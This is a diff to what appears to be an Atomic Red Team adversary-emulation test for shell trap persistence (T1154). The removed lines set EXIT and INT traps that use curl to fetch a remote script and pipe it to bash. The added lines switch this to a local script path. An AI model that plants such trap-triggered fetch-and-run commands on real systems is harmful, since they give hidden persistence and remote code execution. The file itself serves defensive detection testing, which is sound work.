@@ -11,13 +11,11 @@ atomic_tests:
     
   supported_platforms:
     - macos
-    - centos
-    - ubuntu
     - linux
 
   executor:
     name: sh
     command: |
-      trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' EXIT
+      trap "nohup sh $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash" EXIT
       exit
-      trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' INT
+      trap "nohup sh $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash" SIGINt
